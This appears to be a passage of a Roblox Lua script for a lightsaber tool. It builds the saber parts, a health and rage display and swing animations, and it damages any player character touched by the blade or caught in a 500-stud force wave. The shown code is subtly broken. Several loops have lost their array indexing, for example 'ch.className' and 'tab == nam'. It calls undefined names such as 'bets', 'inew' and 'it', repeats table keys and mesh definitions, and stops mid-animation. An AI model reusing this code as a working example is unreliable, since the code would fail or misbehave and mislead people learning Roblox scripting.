vn = Vector3.new
cn = CFrame.new
ca = CFrame.Angles
mpi = math.pi
v3 = vn
mr = math.rad
br = BrickColor.new
cf = CFrame.new
ca = CFrame.Angles
Colors = {"Really Red"}
BladeColor = tostring(BrickColor.Random()) --Colors[math.random(1,#Colors)]
TrailColor = BladeColor
HopperName = "light saber"
Rage = 100000
MaxRage = Rage
SwordType = "Single"
LeftDebounce = {}
RightDebounce = {}
OtherDebounce = {}
Anim = {key = {}}
for i=1,#bets do table.insert(Anim.key,bets) end
Anim.Move = "None"
Anim.Click = false
Anim.Button = false
Anim.CanBerserk = 0
Anim.ComboBreak = false
Anim.Equipped = false
keydown = false
Speed = 2
RageIncome = 500
Left = false
Right = false
Anim.Act = false
RealSpeed = 35
DebounceSpeed = 0.85/Speed
RageCost = {
["Berserk"] = 200;
["RotorBlade"] = 30;
["Blocking"] = 0.1;
["Boomerang"] = 30;
["RageRegening"] = -0.7;
["BoulderForce"] = 45;
["ForceWave"] = 65;
["ForceWave"] = 32;
["Teleport"] = 25;
["DualSpin"] = 4;
}
MagnitudeHit = {
["ForceWave"] = 500;
}
Damage = {
["RotorBlade"] = 8;
["BoulderForce"] = 100;
["Boomerang"] = 100;
["ForceWave"] = 100;
["DualSpin"] = 5;
}
Props = {}
Props.MaxTeleDistance = 500
Props.Buff = 1
BlastMesh = Instance.new("FileMesh")
BlastMesh.MeshId = "http://www.roblox.com/asset/?id=20329976"
RingMesh = Instance.new("FileMesh")
RingMesh.MeshId = "http://www.roblox.com/asset/?id=3270017"
RockMesh = Instance.new("FileMesh")
RockMesh.MeshId = "http://www.roblox.com/asset/?id=1290033"
RockMesh.TextureId = "http://www.roblox.com/asset/?id=1290030"
DiamondMesh = Instance.new("FileMesh")
DiamondMesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"
RingMesh = Instance.new("FileMesh")
RingMesh.MeshId = "http://www.roblox.com/asset/?id=3270017"
RockMesh = Instance.new("FileMesh")
RockMesh.MeshId = "http://www.roblox.com/asset/?id=1290033"
RockMesh.TextureId = "http://www.roblox.com/asset/?id=1290030"
DiamondMesh = Instance.new("FileMesh")
DiamondMesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"
RockMesh = Instance.new("FileMesh")
RockMesh.MeshId = "http://www.roblox.com/asset/?id=1290033"
RockMesh.TextureId = "http://www.roblox.com/asset/?id=1290030"
DiamondMesh = Instance.new("FileMesh")
DiamondMesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"
DiamondMesh = Instance.new("FileMesh")
DiamondMesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"
 
function rayCast(Pos, Dir, Max, Ignore)
return Workspace:FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore)
end
function MinusRage(raggge)
Rage = Rage - raggge
if Rage < 0 then Rage = 0 end
end
 
function r(zParent,zName)
if zParent:findFirstChild(zName) ~= nil then
zParent[zName]:Remove()
else
end
end
function rclass(zParent,zClass)
local ch = zParent:GetChildren()
for i=1,#ch do
if (ch.className == zClass) then
ch:Remove()
else
end
end
end
 
function fWeld(zName,zParent,zPart0,zPart1,zCoco,a,b,c,d,e,f)
local funcw = Instance.new("Weld")
funcw.Name = zName
funcw.Parent = zParent
funcw.Part0 = zPart0
funcw.Part1 = zPart1
if (zCoco == true) then
funcw.C0 = CFrame.new(a,b,c) *CFrame.fromEulerAnglesXYZ(d,e,f)
else
funcw.C1 = CFrame.new(a,b,c) *CFrame.fromEulerAnglesXYZ(d,e,f)
end
return funcw
end
function Dash(ob,se,mes,of)
local off = nil
if of == nil then off = 0 else off = of end
pcall(function()
coroutine.resume(coroutine.create(function()
local dashin = true
local oldpos = (ob.CFrame *CFrame.new(0,off,0)).p
coroutine.resume(coroutine.create(function()
wait(se) dashin = false end))
for i=1,9999 do
if dashin == false then break end
local newpos = (ob.CFrame *CFrame.new(0,off,0)).p --+ Vector3.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
local np = Instance.new("Part")
np.BrickColor = BrickColor.new(TrailColor) np.CanCollide = false
np.BottomSurface = 0 np.TopSurface = 0 np.Anchored = true np.Transparency = 0.4
np.formFactor = "Custom" np.Parent = ob local mag = math.abs((newpos - oldpos).magnitude)
local mp = nil
if mes ~= nil then
np.Size = Vector3.new(2,mag,2) mp = Instance.new("FileMesh",np) mp.MeshId = mes else
np.Size = Vector3.new(0.4,0.4,mag) mp = Instance.new("BlockMesh",np) end
np.CFrame = CFrame.new(newpos,oldpos)
np.CFrame = np.CFrame + np.CFrame.lookVector* (mag/2)
if mes == BlastMesh.MeshId then np.CFrame = np.CFrame *ca(mr(-90),0,0) else np.CFrame = np.CFrame *ca(0,0,mr(-45)) end
oldpos = newpos
coroutine.resume(coroutine.create(function()
for i=1,0,-0.1 do
np.Transparency = np.Transparency + 0.03
--if mes ~= nil then
--mp.Scale = Vector3.new(i,mag,i) else
mp.Scale = Vector3.new(i,i,1) -- end
wait()
end
np:Remove()
end))
wait(0.08)
end
end))
end)
end
Sounds = {
Boom = "http://www.roblox.com/asset/?id=16976189";
SniperFire = "http://www.roblox.com/asset/?id=1369158";
ShotgunFire2 = "http://www.roblox.com/asset/?id=1868836";
MinigunFire = "http://www.roblox.com/asset/?id=2692806";
MinigunCharge = "http://www.roblox.com/asset/?id=2692844";
MinigunDischarge = "http://www.roblox.com/asset/?id=1753007";
Flashbang = "http://www.roblox.com/asset/?id=16976189";
Beep = "http://www.roblox.com/asset/?id=15666462";
Smash = "http://www.roblox.com/asset/?id=2801263";
Punch = "http://www.roblox.com/asset/?id=31173820";
Slash = "rbxasset://sounds/swordslash.wav";
Falcon = "http://www.roblox.com/asset/?id=1387390";
Cast = "http://www.roblox.com/asset/?id=2101137";
Spin = "http://www.roblox.com/asset/?id=1369159";
Abscond = "http://www.roblox.com/asset/?id=2767090";
ElectricalCharge = "http://www.roblox.com/asset/?id=2800815";
FireExplosion = "http://www.roblox.com/asset/?id=3264793";
SaberLightUp = "http://www.roblox.com/asset/?id=10209303";
SaberSlash = "http://www.roblox.com/asset/?id=10209280";
SaberHit = "http://www.roblox.com/asset/?id=44463749";
EnergyBlast = "http://www.roblox.com/asset/?id=10209268";
}
function Sound(sid,pit,vol)
local ss = Instance.new("Sound")
ss.Name = "Sound"
ss.Parent = Head
ss.SoundId = sid
ss.Pitch = pit
ss.Volume = vol
ss.PlayOnRemove = true
wait()
ss:Remove()
end
 
 
r(Char,"SwordPack")
r(Char,"Suit")
r(Char,"Saber" ..Player.Name)
r(Pg,"Sabers")
Suit = inew("Model")
Suit.Name = "Suit"
Suit.Parent = Char
function p(pa,sh,x,y,z,c,a,tr,re,bc)
local fp = it("Part",pa)
fp.formFactor = "Custom"
fp.Shape = sh
fp.Size = v3(x,y,z)
fp.CanCollide = c
fp.Anchored = a
fp.BrickColor = br(bc)
fp.Transparency = tr
fp.Reflectance = re
fp.BottomSurface = 0
fp.TopSurface = 0
fp.CFrame = Torso.CFrame
fp:BreakJoints()
return fp
end
function weld(pa,p0,p1,x,y,z,a,b,c)
local fw = it("Weld",pa)
fw.Part0 = p0
fw.Part1 = p1
fw.C0 = cf(x,y,z) *ca(a,b,c)
return fw
end
function ft(tab,nam)
if tab == nil or nam == nil then print("U: Fail table") return false end
for i=1,#tab do
if tab == nam then
return i
else
end
end
return nil
end
function spm(ty,pa,ssx,ssy,ssz)
local sp = it("SpecialMesh",pa)
sp.MeshType = ty
sp.Scale = Vector3.new(ssx,ssy,ssz)
return sp
end
Torso.Transparency = 1
Torm = Instance.new("Model",Char)
Torm.Name = "Saber" ..Player.Name
Tor = p(Torm,"Block",1.98,1.98,1,false,false,0,0,"basda") Tor.Name = "Torso"
Torw = weld(Tor,Torso,Tor,0,0,0,0,0,0)
pcall(function() Char.Shirt:Clone().Parent = Torm end)
pcall(function() Char.Pants:Clone().Parent = Torm end)
function ShockWave(onb,scale,col)
coroutine.resume(coroutine.create(function()
local e1 = Instance.new("Part")
e1.Anchored = true
e1.formFactor = "Custom"
e1.CanCollide = false
e1.Size = Vector3.new(1,1,1)
e1.BrickColor = BrickColor.new(col)
e1.Transparency = 0.6
e1.TopSurface = 0
e1.BottomSurface = 0
e1.Parent = Torm
e1.CFrame = onb.CFrame
e1.CFrame = e1.CFrame *CFrame.Angles(math.rad(-90),0,0)
local e1m = Instance.new("SpecialMesh")
e1m.MeshType = "FileMesh"
e1m.Scale = Vector3.new(3,3,3)
e1m.Parent = e1
e1m.MeshId = RingMesh.MeshId
local r1 = Instance.new("Part")
r1.Anchored = true
r1.formFactor = "Custom"
r1.CanCollide = false
r1.Size = Vector3.new(1,1,1)
r1.BrickColor = BrickColor.new(col)
r1.Transparency = 0.6
r1.TopSurface = 0
r1.BottomSurface = 0
r1.Parent = Torm
r1.CFrame = e1.CFrame *CFrame.Angles(math.rad(90),0,0)
local r1m = Instance.new("SpecialMesh")
r1m.MeshType = "FileMesh"
r1m.Scale = Vector3.new(3,3,3)
r1m.Parent = r1
r1m.MeshId = BlastMesh.MeshId
for i=1,30 do
local pluscal = scale/38
e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
r1m.Scale = r1m.Scale + Vector3.new(pluscal/1.5,pluscal/3,pluscal/1.5)
r1.CFrame = r1.CFrame * CFrame.Angles(0,math.rad(6),0)
wait()
end
for i=1,30 do
local pluscal = scale/38
e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
r1m.Scale = r1m.Scale + Vector3.new(pluscal/1.5,pluscal/4,pluscal/1.5)
r1.CFrame = r1.CFrame * CFrame.Angles(0,math.rad(6),0)
e1.Transparency = e1.Transparency + 0.1
r1.Transparency = r1.Transparency + 0.1
wait()
end
e1:Remove()
r1:Remove()
end))
end
 
function Explode(onb,scale,col)
coroutine.resume(coroutine.create(function()
local e1 = Instance.new("Part")
e1.Anchored = true
e1.formFactor = "Custom"
e1.CanCollide = false
e1.Size = Vector3.new(1,1,1)
e1.BrickColor = BrickColor.new(col)
e1.Transparency = 0.6
e1.TopSurface = 0
e1.BottomSurface = 0
e1.Parent = Torm
e1.CFrame = onb.CFrame
local e1m = Instance.new("SpecialMesh")
e1m.MeshType = "Sphere"
e1m.Parent = e1
local r1 = Instance.new("Part")
r1.Anchored = true
r1.formFactor = "Custom"
r1.CanCollide = false
r1.Size = Vector3.new(1,1,1)
r1.BrickColor = BrickColor.new(col)
r1.Transparency = 0.6
r1.TopSurface = 0
r1.BottomSurface = 0
r1.Parent = Torm
r1.CFrame = e1.CFrame *CFrame.Angles(math.rad(180),0,0)
local r1m = Instance.new("SpecialMesh")
r1m.MeshType = "FileMesh"
r1m.Scale = Vector3.new(3,3,3)
r1m.Parent = r1
r1m.MeshId = RingMesh.MeshId
local r2 = Instance.new("Part")
r2.Anchored = true
r2.formFactor = "Custom"
r2.CanCollide = false
r2.Size = Vector3.new(1,1,1)
r2.BrickColor = BrickColor.new(col)
r2.Transparency = 0.6
r2.TopSurface = 0
r2.BottomSurface = 0
r2.Parent = Torm
r2.CFrame = e1.CFrame *CFrame.Angles(0,math.rad(180),0)
local r2m = Instance.new("SpecialMesh")
r2m.MeshType = "FileMesh"
r2m.Parent = r2
r2m.Scale = Vector3.new(3,3,3)
r2m.MeshId = RingMesh.MeshId
local bla = Instance.new("Part")
bla.Anchored = true
bla.formFactor = "Custom"
bla.CanCollide = false
bla.Size = Vector3.new(1,1,1)
bla.BrickColor = BrickColor.new(col)
bla.Transparency = 0.6
bla.TopSurface = 0
bla.BottomSurface = 0
bla.Parent = Torm
bla.CFrame = CFrame.new(e1.Position.x,e1.Position.y,e1.Position.z)
local blam = Instance.new("SpecialMesh")
blam.MeshType = "FileMesh"
blam.Parent = bla
blam.Scale = Vector3.new(5,5,5)
blam.MeshId = BlastMesh.MeshId
for i=1,30 do
local pluscal = scale/38
e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
r1m.Scale = r1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
r2m.Scale = r1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
blam.Scale = blam.Scale + Vector3.new(pluscal,pluscal/2,pluscal)
bla.CFrame = bla.CFrame * CFrame.Angles(0,math.rad(12),0)
r1.CFrame = r1.CFrame * CFrame.Angles(math.rad(6),0,0)
r2.CFrame = r2.CFrame * CFrame.Angles(0,math.rad(6),0)
wait()
end
for i=1,30 do
local pluscal = scale/38
e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
r1m.Scale = r1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
r2m.Scale = r1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
blam.Scale = blam.Scale + Vector3.new(pluscal/1.5,pluscal/3,pluscal/1.5)
bla.CFrame = bla.CFrame * CFrame.Angles(0,math.rad(12),0)
r1.CFrame = r1.CFrame * CFrame.Angles(math.rad(6),0,0)
r2.CFrame = r2.CFrame * CFrame.Angles(0,math.rad(6),0)
bla.Transparency = bla.Transparency + 0.1
e1.Transparency = e1.Transparency + 0.1
r1.Transparency = r1.Transparency + 0.1
r2.Transparency = r2.Transparency + 0.1
wait()
end
e1:Remove()
r1:Remove()
r2:Remove()
end))
end
H1 = p(Torm,"Block",0.5,0.9,0.5,false,false,0,0.1,"Medium stone grey") spm("Head",H1,1,1.3,1)
H1w = weld(Tor,Torso,H1,0.4,-0.7,0.5,0,0,mr(45))
H2 = p(Torm,"Block",0.5,0.9,0.5,false,false,0,0.1,"Medium stone grey") spm("Head",H2,1,1.3,1)
H2w = weld(Tor,H1,H2,0,-0.8,0,mr(180),0,0)
Des1 = p(Torm,"Block",0.6,0.1,0.6,false,false,0,0.1,"Black") Instance.new("CylinderMesh",Des1)
Des1w = weld(Tor,H1,Des1,0,0.5,0,0,0,0)
Des2 = p(Torm,"Block",0.6,0.1,0.6,false,false,0,0.1,"Black") Instance.new("CylinderMesh",Des2)
Des2w = weld(Tor,H2,Des2,0,0.5,0,0,0,0)
Des21 = p(Torm,"Block",0.6,0.1,0.6,false,false,0,0.1,"Black") Des21m = Instance.new("CylinderMesh",Des21) Des21m.Scale = Vector3.new(1,0.6,1)
Des21w = weld(Tor,H1,Des21,0,-0.55,0,0,0,0)
Des22 = p(Torm,"Block",0.6,0.1,0.6,false,false,0,0.1,"Black") Des22m = Instance.new("CylinderMesh",Des22) Des22m.Scale = Vector3.new(1,0.6,1)
Des22w = weld(Tor,H2,Des22,0,-0.55,0,0,0,0)
 
Blad1 = p(Torm,"Block",0.3,4,0.3,false,false,1,0.25,BladeColor) M1 = spm("Head",Blad1,1,1,1)
Blad1w = weld(Tor,H1,Blad1,0,1.9,0,0,0,0)
Blad2 = p(Torm,"Block",0.3,4,0.3,false,false,1,0.25,BladeColor) M2 = spm("Head",Blad2,1,1,1)
Blad2w = weld(Tor,H2,Blad2,0,1.9,0,0,0,0)
Glow1 = p(Torm,"Block",0.47,4.2,0.47,false,false,1,0,BladeColor) GM1 = spm("Head",Glow1,1,1,1)
Glow1w = weld(Tor,H1,Glow1,0,1.9,0,0,0,0)
Glow2 = p(Torm,"Block",0.47,4.2,0.47,false,false,1,0,BladeColor) GM2 = spm("Head",Glow2,1,1,1)
Glow2w = weld(Tor,H2,Glow2,0,1.9,0,0,0,0)
 
r(Bp,HopperName)
bin = inew("HopperBin")
bin.Name = HopperName
bin.Parent = Bp
 
Gui = Instance.new("ScreenGui",Pg)
Gui.Name = "Sabers"
Frame = Instance.new("Frame",Gui)
Frame.BackgroundTransparency = 1 Frame.Size = UDim2.new(1,0,1,0)
ImageGui = Instance.new("ImageLabel",Frame)
ImageGui.Image = "http://www.roblox.com/asset/?id=51262246"
ImageGui.BackgroundTransparency = 1
ImageGui.Size = UDim2.new(0.3,0,0.075,0)
HealthBar = Instance.new("ImageLabel",Frame)
HealthBar.Image = "http://www.roblox.com/asset/?id=48965808"
HealthBar.BorderSizePixel = 0
HealthBar.Size = UDim2.new(0.23,0,0.017,0)
HealthBar.Position = UDim2.new(0.06,0,0.017,0)
RageBar = Instance.new("ImageLabel",Frame)
RageBar.Image = "http://www.roblox.com/asset/?id=48965808"
RageBar.BorderSizePixel = 0
RageBar.Size = UDim2.new(0.165,0,0.012,0)
RageBar.Position = UDim2.new(0.06,0,0.04,0)
RageBar.BackgroundColor3 = BrickColor.new("Alder").Color
SelectBar = Instance.new("ImageButton",Frame)
SelectBar.Image = "http://www.roblox.com/asset/?id=48965808"
SelectBar.BorderSizePixel = 0
SelectBar.Size = UDim2.new(0.1,0,0.07,0)
SelectBar.Position = UDim2.new(0.8,0,0.6,0)
SelectBar.BackgroundColor3 = BrickColor.new(BladeColor).Color
SelectrBar = Instance.new("TextLabel",SelectBar)
SelectrBar.BackgroundTransparency = 1
SelectrBar.BorderSizePixel = 0
SelectrBar.Size = UDim2.new(0,0,0,0)
SelectrBar.Position = UDim2.new(0.5,0,0.5,0)
SelectrBar.Font = "ArialBold"
SelectrBar.FontSize = "Size18"
SelectBar.MouseButton1Up:connect(function()
if Anim.Move ~= "None" then return end
if Anim.Act == true then return end
if Anim.Equipped == false then return end
if SwordType == "Single" then
Anim.Move = "Changing"
Anims.ChangeToDual(0,1,0.065*Speed) SwordType = "Dual"
Anim.Move = "None"
else
Anim.Move = "Changing"
Anims.ChangeToSingle(0,1,0.065*Speed) SwordType = "Single"
Anim.Move = "None"
end
end)
coroutine.resume(coroutine.create(function()
while true do
wait(0.05)
local hh = Hum.Health local hmh = Hum.MaxHealth
HealthBar.Size = UDim2.new((hh/hmh)*0.23,0,0.017,0)
if ((hh/hmh)*100) > 75 then
HealthBar.BackgroundColor3 = BrickColor.new("Alder").Color
elseif ((hh/hmh)*100) > 25 and ((hh/hmh)*100) < 76 then
HealthBar.BackgroundColor3 = BrickColor.new("Deep orange").Color
elseif ((hh/hmh)*100) < 26 then
HealthBar.BackgroundColor3 = BrickColor.new("Bright red").Color
end
RageBar.Size = UDim2.new((Rage/MaxRage)*0.165,0,0.012,0)
SelectrBar.Text = SwordType
end
end))
-------
function TellXPos(brick1,posd)
local lb = p(nil,"Block",1,1,1,true,false,1,0.1,BladeColor)
lb.CFrame = CFrame.new((brick1.CFrame *cf(-10,0,0)).p)
local rb = p(nil,"Block",1,1,1,true,false,1,0.1,BladeColor)
rb.CFrame = CFrame.new((brick1.CFrame *cf(10,0,0)).p)
local posml = math.abs((posd - rb.Position).magnitude)
local posmr = math.abs((posd - lb.Position).magnitude)
if posml > posmr then
return "left"
else
return "right"
end
end
function GetNearPlayer(urpos,maxmag)
if maxmag == nil then return nil end
for i,v in pairs(game.Players:GetChildren()) do
if v.Character ~= Char and v.Character ~= nil and v.Character:findFirstChild("Torso") ~= nil and math.abs((v.Character.Torso.Position-urpos).magnitude) < maxmag then
return v.Character.Torso
end
end
return nil
end
function Dmgz(hum,dmg)
dmg = dmg*Props.Buff
hum.Health = hum.Health - dmg
Rage = Rage + ((dmg/1.25)*RageIncome)
if Rage > MaxRage then Rage = MaxRage end
end
coroutine.resume(coroutine.create(function()
while true do
wait()
if Right == true and Anim.Move == "ForceWave" then
for i,v in pairs(workspace:GetChildren()) do
coroutine.resume(coroutine.create(function()
if v ~= Char and v ~= nil and v:findFirstChild("Torso") ~= nil and math.abs((v.Torso.Position-Blad2.Position).magnitude) < MagnitudeHit[Anim.Move] then
local hit = v.Torso
if hit ~= nil and hit.Parent:findFirstChild("Humanoid") ~= nil and ft(RightDebounce,hit.Parent.Name) == nil then
Dmgz(hit.Parent.Humanoid,Damage[Anim.Move])
table.insert(RightDebounce,hit.Parent.Name)
wait(DebounceSpeed) local nf = ft(RightDebounce,hit.Parent.Name) if nf ~= nil then table.remove(RightDebounce,nf) end
end
else
if v:IsA("BasePart") and v.Anchored == false and math.abs((v.Position-Blad2.Position).magnitude) < MagnitudeHit[Anim.Move] then v:BreakJoints() v.Velocity = cf(Blad2.Position,v.Position).lookVector*30 + Vector3.new(0,20,0) end
end
end))
end -- for
end
end
end))
Blad1.Touched:connect(function(hit)
if Left == true then
if hit ~= nil and hit.Parent:findFirstChild("Humanoid") ~= nil and ft(LeftDebounce,hit.Parent.Name) == nil then
coroutine.resume(coroutine.create(function()
table.insert(LeftDebounce,hit.Parent.Name)
wait(DebounceSpeed) local nf = ft(LeftDebounce,hit.Parent.Name) if nf ~= nil then table.remove(LeftDebounce,nf) end
end))
Sound(Sounds.SaberHit,1,1)
Dmgz(hit.Parent.Humanoid,Damage[Anim.Move])
else
--if hit.Parent:findFirstChild("Humanoid") == nil and not hit:IsDescendantOf(Char) and hit.Anchored == false then hit:BreakJoints() hit.Velocity = cf(Blad1.Position,hit.Position).lookVector*30 end
end
end
end)
 
Blad2.Touched:connect(function(hit)
if Right == true then
if hit ~= nil and hit.Parent:findFirstChild("Humanoid") ~= nil and ft(RightDebounce,hit.Parent.Name) == nil then
coroutine.resume(coroutine.create(function()
table.insert(RightDebounce,hit.Parent.Name)
wait(DebounceSpeed) local nf = ft(RightDebounce,hit.Parent.Name) if nf ~= nil then table.remove(RightDebounce,nf) end
end))
Sound(Sounds.SaberHit,1,1)
Dmgz(hit.Parent.Humanoid,Damage[Anim.Move])
else
--if hit.Parent:findFirstChild("Humanoid") == nil and not hit:IsDescendantOf(Char) and hit.Anchored == false then hit:BreakJoints() hit.Velocity = cf(Blad2.Position,hit.Position).lookVector*30 end
end
end
end)
LW = inew("Weld")
RW = inew("Weld")
Fla = p(Torm,"Block",1,2,1,false,false,1,0,BladeColor)
Fra = p(Torm,"Block",1,2,1,false,false,1,0,BladeColor)
Flaw = fWeld("Weld",Fla,Tor,Fla,true,-1.5,0.5,0,0,0,0)
Fraw = fWeld("Weld",Fla,Tor,Fra,true,1.5,0.5,0,0,0,0)
Flaw.C1 = CFrame.new(0,0.5,0)
Fraw.C1 = CFrame.new(0,0.5,0)
 
Fll = p(Torm,"Block",1,2,1,false,false,1,0,BladeColor)
Frl = p(Torm,"Block",1,2,1,false,false,1,0,BladeColor)
Fllw = fWeld("Weld",Fll,Torso,Fll,true,0,0,0,0,0,0)
Frlw = fWeld("Weld",Fll,Torso,Frl,true,0,0,0,0,0,0)
 
function FeetWeld(yesorno,lhh,rhh)
if yesorno == false then
lhh.Parent = nil
rhh.Parent = nil
Lh.Parent = Torso
Rh.Parent = Torso
Lh.Part0 = Tor
Rh.Part0 = Tor
Lh.Part1 = Char["Left Leg"]
Rh.Part1 = Char["Right Leg"]
return Lh,Rh
else
Rh.Parent = nil
Lh.Parent = nil
local hl,hr = it("Weld",Torso),it("Weld",Torso)
hl.Part0 = Fll
hr.Part0 = Frl
hl.Part1 = Char["Left Leg"]
hr.Part1 = Char["Right Leg"]
hr.C1 = cf(-0.5,1.75,0)
hl.C1 = cf(0.5,1.75,0)
return hl,hr
end
end
Anims = {}
Anims.Equip = function(i1,i2,is)
Anim.Act = true
for i=i1,i2,is do
RW.C1 = ca(mr(40*i),mr(20*i),0)
RW.C0 = cf(-0.4*i,-0.1*i,0.4*i)
wait()
end
H1w.Part0 = Ra
H1w.Part1 = H1
H1w.C0 = cf(0,-1.1,0) *ca(0,mr(180),0) H1w.C1 = ca(mr(-90),0,0)
Sound(Sounds.Slash,1,1)
for i=i1,i2,is do
H1w.C0 = cf(0,-1.1,0) *ca(0,mr(90+(270*i)),0)
LW.C1 = ca(mr(-80*i),mr(40*i),0)
LW.C0 = cf(0.6*i,0.3*i,-1*i)
RW.C1 = ca(mr(40+(-120*i)),mr(20+(-60*i)),0)
RW.C0 = cf(-0.4+(-0.2*i),-0.1+(0.4*i),0.4+(-1.4*i))
wait()
end
Sound(Sounds.SaberLightUp,3,1)
for i=i1,i2,is do
Blad1w.C0 = cf(0,0.95+(0.95*i),0)
Blad2w.C0 = cf(0,0.95+(0.95*i),0)
M1.Scale = Vector3.new(1,1*i,1)
M2.Scale = Vector3.new(1,1*i,1)
Blad1.Transparency = 0.9-(1*i)
Blad2.Transparency = 0.9-(1*i)
Glow1w.C0 = cf(0,0.95+(0.95*i),0)
Glow2w.C0 = cf(0,0.95+(0.95*i),0)
GM1.Scale = Vector3.new(1,1*i,1)
GM2.Scale = Vector3.new(1,1*i,1)
Glow1.Transparency = 1.05-(0.5*i)
Glow2.Transparency = 1.05-(0.5*i)
wait()
end
Anim.Act = false
end
Anims.UnEquip = function(i1,i2,is)
Anim.Act = true
Sound(Sounds.SaberLightUp,3,1)
for i=i1,i2,is do
Blad1w.C0 = cf(0,0.95+(0.95*i),0)
Blad2w.C0 = cf(0,0.95+(0.95*i),0)
M1.Scale = Vector3.new(1,1*i,1)
M2.Scale = Vector3.new(1,1*i,1)
Blad1.Transparency = 0.9-(1*i)
Blad2.Transparency = 0.9-(1*i)
Glow1w.C0 = cf(0,0.95+(0.95*i),0)
Glow2w.C0 = cf(0,0.95+(0.95*i),0)
GM1.Scale = Vector3.new(1,1*i,1)
GM2.Scale = Vector3.new(1,1*i,1)
Glow1.Transparency = 1.05-(0.5*i)
Glow2.Transparency = 1.05-(0.5*i)
wait()
end
Sound(Sounds.Slash,1,1)
for i=i1,i2,is do
H1w.C0 = cf(0,-1.1,0) *ca(0,mr(90+(270*i)),0)
LW.C1 = ca(mr(-80*i),mr(40*i),0)
LW.C0 = cf(0.6*i,0.3*i,-1*i)
RW.C1 = ca(mr(40+(-120*i)),mr(20+(-60*i)),0)
RW.C0 = cf(-0.4+(-0.2*i),-0.1+(0.4*i),0.4+(-1.4*i))
wait()
end
H1w.Part0 = Torso
H1w.Part1 = H1
H1w.C0 = cf(0.4,-0.7,0.5) *ca(0,0,mr(45))
H1w.C1 = cf(0,0,0) *ca(0,0,0)
for i=i1,i2,is do
RW.C1 = ca(mr(40*i),mr(20*i),0)
RW.C0 = cf(-0.4*i,-0.1*i,0.4*i)
wait()
end
Anim.Act = false
end
Anims.ChangeToDual = function(i1,i2,is)
Anim.Act = true
for i=i1,i2,is*Speed do
H1w.C0 = cf(0,-1.1,0) *ca(mr(-80*i),mr(50*i),0)
wait()
end
Sound(Sounds.SaberHit,1,1)
Sound(Sounds.SaberLightUp,2,0.5)
H1w.Part0 = La
H1w.Part1 = H1
H2w.Part0 = Ra
H2w.Part1 = H2
H2w.C1 = ca(mr(-90),0,0)
for i=i1,i2,is*Speed do
H1w.C0 = cf(0,-1.1,0) *ca(0,mr(-90+(-90*i)),mr(20+(-20*i)))
H2w.C0 = cf(0,-1.1,0) *ca(0,mr(90+(90*i)),mr(-35+(-35*i)))
LW.C1 = ca(mr(-80+(20*i)),mr(40+(-70*i)),0)
LW.C0 = cf(0.6+(-0.6*i),0.3+(-0.3*i),-1+(0.5*i))
RW.C1 = ca(mr(-80+(20*i)),mr(-40+(70*i)),0)
RW.C0 = cf(-0.6+(0.6*i),0.3+(-0.3*i),-1+(0.5*i))
wait()
end
Anim.Act = false
end
Anims.ChangeToSingle = function(i1,i2,is)
Anim.Act = true
for i=i2,i1,-is*Speed do
H1w.C0 = cf(0,-1.1,0) *ca(0,mr(-90+(-90*i)),mr(20+(-20*i)))
H2w.C0 = cf(0,-1.1,0) *ca(0,mr(90+(90*i)),mr(-35+(-35*i)))
LW.C1 = ca(mr(-80+(20*i)),mr(40+(-70*i)),0)
LW.C0 = cf(0.6+(-0.6*i),0.3+(-0.3*i),-1+(0.5*i))
RW.C1 = ca(mr(-80+(20*i)),mr(-40+(70*i)),0)
RW.C0 = cf(-0.6+(0.6*i),0.3+(-0.3*i),-1+(0.5*i))
wait()
end
H1w.Part0 = Ra
H1w.Part1 = H1
H2w.Part0 = H1
H2w.Part1 = H2
H2w.C1 = ca(0,0,0)
H2w.C0 = cf(0,-0.8,0) *ca(mr(180),0,0)
Sound(Sounds.SaberLightUp,2,0.5)
Sound(Sounds.SaberHit,1,1)
for i=i2,i1,-is*Speed do
H1w.C0 = cf(0,-1.1,0) *ca(mr(-80*i),mr(50*i),0)
wait()
end
Anim.Act = false
end
Anims.RotorBlade = function(i1,i2,is,RaigCost)
local lolpos = (Torso.Position - mouse.hit.p).unit
local allx = (lolpos.y*80)-10
local ally = (((mouse.X-(mouse.ViewSizeX/2))/mouse.ViewSizeX)*1.8)*-90
Anim.Act = true
for i=i1,i2,is do
LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(40+(-40*i)),0)
LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(90*i),0)
RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(((-90)+ally)*i),0)
Torw.C1 = ca(0,mr(-90*i),0)
wait()
end
DebounceSpeed = DebounceSpeed - (0.5*Speed)
Hum.WalkSpeed = Hum.WalkSpeed + (8*Speed)
Left = true
Right = true
Dash(Blad1,2/Speed,nil,2)
Dash(Blad2,2/Speed,nil,2)
H1w.C0 = cf(0,-1.1,0) *ca(0,0,0) H1w.C1 = cf(0,-0.4,0) *ca(mr(-90),0,0)
local soundtime = 0
for i=i1,i2*4,is do
if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end
H1w.C0 = cf(0,-1.1,0) *ca(0,mr(360*i),0)
wait()
end
H1w.C0 = cf(0,-1.1,0) *ca(0,0,0) H1w.C1 = cf(0,0,0) *ca(mr(-90),0,0)
DebounceSpeed = DebounceSpeed + (0.5*Speed)
Hum.WalkSpeed = Hum.WalkSpeed - (8*Speed)
Left = false
Right = false
for i=i2,i1,-is do
LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(40+(-40*i)),0)
LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(90*i),0)
